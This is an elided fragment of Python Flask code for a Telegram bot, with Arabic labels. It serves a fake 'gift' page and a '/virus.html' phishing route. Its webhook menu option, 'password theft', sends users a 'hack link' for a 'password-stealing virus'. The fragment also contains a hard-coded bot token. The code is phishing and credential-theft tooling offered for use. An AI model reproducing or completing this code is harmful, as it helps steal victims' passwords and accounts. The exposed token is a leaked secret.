...
TOKEN = "8340068132:AAEkeGWfATw9SzIF7BjMECBogLiqUPE3h5U"
...
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>{platform} - هدية</title>
<style>
...
@app.route('/virus.html') def virus(): return phish_page("فيروس باسووردات", request.args.get('chatId'))

@app.route("/") def home(): return "✅ البوت شغال! ابو الجود"
...
def webhook():
    try:
        ...
        if "message" in data:
            ...
            elif text == "💀 سرقة باسووردات": send_hack_link(chat_id, "فيروس سرقة باسووردات", "virus")
            else:
